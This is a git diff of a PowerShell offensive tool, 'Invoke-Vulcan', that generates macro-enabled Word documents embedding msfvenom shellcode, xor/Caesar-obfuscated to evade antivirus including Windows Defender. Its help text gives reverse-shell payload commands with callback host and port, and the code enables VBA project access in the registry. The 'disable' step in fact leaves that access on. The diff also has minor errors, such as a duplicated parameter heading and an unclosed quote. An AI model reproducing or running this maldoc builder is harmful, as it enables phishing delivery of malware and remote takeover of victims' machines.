@@ -1,7 +1,7 @@
 function Invoke-Vulcan {
     <#
     .SYNOPSIS
-        Automate the creation of macro-enabled Word documents that - at the time of writing - evades most AVs, including Windows Defender.
+        Streamlines the process of creating macro-enabled Word documents.
 
         Author: Alexandre Teyar (@aress31)
         License: BSD 3-Clause
@@ -9,8 +9,17 @@ function Invoke-Vulcan {
         Optional Dependencies: None
 
     .DESCRIPTION
-        Using MSFVenom and BadAssMacros, creates a macro-enabled Word document that - at the time
+        Using MSFVenom creates a macro-enabled Word document that - at the time
         of writing - evade most AVs, including Windows Defender.
+
+    .PARAMETER CaesarShift
+        Specifies the Caesar shift value to use with the xor decoder.
+
+    .PARAMETER Decoder
+        Specifies the type of decoder to use, e.g., xor.
+
+    .PARAMETER Decoder
+        Path to the Visual Basic decoding function.
 
     .PARAMETER OutputDirectory
         Folder to output files too.
@@ -18,41 +27,47 @@ function Invoke-Vulcan {
     .PARAMETER OutputPrefix
         Prefix to add to output files.
 
-    .PARAMETER Payload
-        Specifies the MSFVenom payload to use.
-
-    .PARAMETER PayloadOptions
-        Specifies the options to use for the selected Payload.
+    .PARAMETER ShellCode
+        Specifies the (hex-encoded) shellcode to use.
 
     .PARAMETER Template
-        Specifies the VBA template to use.
+        Path to the Visual Basic template to use.
 
     .PARAMETER Treshold
         Specifies the threshold to use before breaking the shellcode array lines.
   
     .EXAMPLE
-        PS C:\> Invoke-Vulcan -Payload "meterpreter/reverse_https" -PayloadOptions "LHOST=192.168.0.24 LPORT=443 EXITFUNC=thread" -Template "./assets/templates/indirect.vba"
+        PS C:\>  wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.Visual Basic -CaesarShift 5
 
         Executes MSFVenom with the specified payload and options, pass the generated raw shellcode to BadAssMacros to obfuscate it in order to evade AVs,
         and then removes creates an empty macro-enabled Word document containing the processed macro.
     #>
 
-    [CmdletBinding(PositionalBinding = $false)]
+    [CmdletBinding(PositionalBinding = $False)]
     param(
+        [ValidateSet("xor")]
+        [string]
+        $Decoder,
+
+        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
+        [String]
+        $DecoderPath,
+
+        [ValidateRange(1, 25)]
+        [int]
+        $CaesarShift,
+
         [ValidateScript({ Test-Path -Path $_ -PathType Container })]
         [String]
         $OutputDirectory = $(Get-Location),
 
         [String]
-        $OutputPrefix,
+        $OutputPrefix = "vulcan",
 
-        [Parameter(Mandatory)]
-        [String]
-        $Payload,
-
-        [Parameter(Mandatory)]
-        [String]
-        $PayloadOptions,
+        [Parameter(Mandatory, ParameterSetName = 'B', ValueFromPipeline)]
+        [string]
+        $ShellCode,
 
         [Parameter(Mandatory)]
         [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
@@ -63,91 +78,36 @@ function Invoke-Vulcan {
         $Treshold = 72
     )
 
-    begin {
-        $PayloadOutput = "${env:TEMP}\msfvenom_$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).bin"
-        $MacroOutput = "${env:TEMP}\macros_$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).vba"
+    $MacroOutput = New-TemporaryFile
+    Resolve-Path `
+        -Path $(Join-Path -Path $OutputDirectory "${OutputPrefix}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).doc") `
+        -ErrorAction SilentlyContinue -ErrorVariable _frperror
+    $WordOutput = $_frperror[0].TargetObject
+
+    Write-Output "[+] Enabling trust access to Visual Basic Project Object Model in Microsoft Word..."
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
+
+    Write-Host "[i] Loading (raw) shellcode..."
+    Create_MacroFromTemplate -CaesarShift $CaesarShift -Decoder $Decoder -DecoderPath $DecoderPath -ShellCode $ShellCode -Template $Template -Treshold $Treshold
+    Create_WordDocument -MacroOutput $MacroOutput -Output $WordOutput
+
+    Write-Host "[-] Removing (Visual Basic) macro file..."
+    Remove-Item -Path $MacroOutput -Force
         
-        $Match = $payloadOptions | Select-String -Pattern "LHOST=(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})"
-        $LHOST = $match.matches.groups[1].Value
-        $Match = $PayloadOptions | Select-String -Pattern "LPORT=(\d{1,5})"
-        $LPORT = $match.matches.groups[1].Value
-        
-        if ($OutputPrefix) {
-            Resolve-Path `
-                -Path $(Join-Path -Path $OutputDirectory "${OutputPrefix}.doc") `
-                -ErrorAction SilentlyContinue -ErrorVariable _frperror
-        }
-        else {
-            Resolve-Path `
-                -Path $(Join-Path -Path $OutputDirectory "$($Payload.Replace('/', '.')).${LHOST}-${LPORT}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).doc") `
-                -ErrorAction SilentlyContinue -ErrorVariable _frperror
-        }
-
-        $WordOutput = $_frperror[0].TargetObject
-
-        Write-Output "[+] Enabling trust access to VBA Project Object Model in Microsoft Word..."
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
-    }
-
-    process {
-        Create_Payload -Payload $Payload -PayloadOptions $PayloadOptions -PayloadOutput $PayloadOutput
-        Create_MacroFromTemplate -ShellCode $PayloadOutput -Template $Template -Treshold $Treshold
-        Create_WordDocument -MacroOutput $MacroOutput -Output $WordOutput
-    }
-
-    end {
-        Write-Host "[-] Removing (raw) payload file..."
-        Remove-Item -Path $PayloadOutput -Force
-        Write-Host "[-] Removing (VBA) macro file..."
-        Remove-Item -Path $MacroOutput -Force
-        
-        Write-Output "[+] Disabling trust access to VBA Project Object Model in Microsoft Word..."
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
-    }
+    Write-Output "[+] Disabling trust access to Visual Basic Project Object Model in Microsoft Word..."
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
 }
 
-function Create_Payload($Payload, $PayloadOptions, $PayloadOutput) {
-    Write-Host "[i] Creating (raw) payload..."
-    $WSLPath = wsl.exe --exec wslpath -a $PayloadOutput
-    $Command = "wsl.exe --exec msfvenom -p $Payload $PayloadOptions -f raw -o $WSLPath"
-
-    Write-Host "[i] Running command: $Command"
-    Invoke-Expression -Command $Command # | Out-Null
-    Write-Host "[i] (Raw) payload written to: $PayloadOutput"
-}
-
-function Convert-RawToByteArray($ShellCode, $Treshold) {
-    $Bytes = [io.file]::ReadAllBytes($ShellCode)
-
-    $i = 0
-    
-    foreach ($x in $Bytes) {
-        if ($i -eq $Treshold) {
-            $FormattedBytes += "${x}, _`r`n"
-            $i = 0
-        } 
-        else {
-            $FormattedBytes += "${x},"
-            $i += 1
-        }
-    }
-    
-    return $FormattedBytes = $FormattedBytes.Substring(0, $FormattedBytes.Length - 1)
-}
-
-function Convert-RawToCharHexArray($ShellCode, $Treshold) {
-    $Bytes = [io.file]::ReadAllBytes($ShellCode)
-    $HexArray = ([System.BitConverter]::ToString($Bytes)).Split('-')
-
-    $i = 0
-
+function Convert-HexArray($HexArray, $Treshold) {
     foreach ($x in $HexArray) {
+        $x = $x.ToUpper()
+
         if ($i -eq $Treshold) {
-            $FormattedBytes += "Chr(&H${x}), _`r`n"
+            $Payload += "Chr(&H${x}), _`r`n"
             $i = 0
         } 
         else {
-            $FormattedBytes += "Chr(&H${x}),"
+            $Payload += "Chr(&H${x}),"
             $i += 1
         }
     }
@@ -172,18 +132,39 @@ function Convert-RawToCharHexArray($ShellCode, $Treshold) {
     }
 
     foreach ($x in $ForbiddenChars.GetEnumerator()) {
-        $FormattedBytes = $FormattedBytes.Replace($x.Name, $x.Value)
+        $Payload = $Payload.Replace($x.Name, $x.Value)
     }
 
-    return $FormattedBytes.Substring(0, $FormattedBytes.Length - 1) 
+    return $Payload
 }
 
-function Create_MacroFromTemplate($ShellCode, $Template, $Treshold) {
-    Write-Host "[i] Creating (VBA) macro..."
-    $PayloadArray = Convert-RawToCharHexArray -ShellCode $ShellCode -Treshold $Treshold
-    Set-Content -Path $MacroOutput -Value (Get-Content -Path $Template).Replace("PAYLOAD", $PayloadArray)
+function Convert-HexToHexArray($ShellCode, $Treshold) {
+    $HexArray = $ShellCode -Split '(.{2})' -ne '' 
+    $Payload = Convert-HexArray -HexArray $HexArray -Treshold $Treshold
 
-    Write-Host "[i] (VBA) macro written to: $MacroOutput"
+    return $Payload.Substring(0, $Payload.Length - 1) 
+}
+
+function Create_MacroFromTemplate($CaesarShift, $Decoder, $DecoderPath, $ShellCode, $Template, $Treshold) {
+    Write-Host "[i] Creating (Visual Basic) macro..."
+    
+    $PayloadArray = Convert-HexToHexArray -ShellCode $ShellCode -Treshold $Treshold
+
+    Write-Debug "Payload array: $PayloadArray"
+
+    switch ($Decoder) {
+        "xor" {
+            Set-Content -Path $MacroOutput -Value (
+                Get-Content -Path $Template).Replace("PAYLOAD", "Array(" + $PayloadArray + ')' + "`r`n" + "`r`n" + "`t" + "kUG(HoR)")
+            Add-Content -Path $MacroOutput -Value ((Get-Content -Path $DecoderPath).Replace("CaesarShift", $CaesarShift))
+        }
+        Default {
+            Set-Content -Path $MacroOutput -Value (
+                (Get-Content -Path $Template).Replace("PAYLOAD", "Array(" + $PayloadArray + ')'))
+        }
+    }
+
+    Write-Host "[i] (Visual Basic) macro written to: $MacroOutput"
 }
 
 function Create_WordDocument($MacroOutput, $Output) {
